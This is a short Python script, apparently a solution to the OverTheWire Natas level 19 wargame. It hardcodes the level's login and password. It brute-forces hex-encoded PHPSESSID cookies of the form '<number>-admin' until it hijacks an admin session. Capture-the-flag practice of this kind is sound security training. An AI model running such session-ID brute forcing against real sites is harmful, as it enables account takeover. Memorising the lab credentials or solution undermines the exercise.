import requests

# Constants
username = 'natas19'
password = '8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s'
user_str = "You are logged in as a regular user."
url = f"http://{username}.natas.labs.overthewire.org/"

for i in range(1, 641):
    session_id = f"{i}-admin"
    cookies = {"PHPSESSID": session_id.encode("utf-8").hex()}
    response = requests.get(url, auth=(username, password), cookies=cookies)

    if user_str in response.text:
        print(f"Attempt {i} is not admin!")
    else:
        print(f"Attempt {i} is admin!")
        print(response.content)
        break
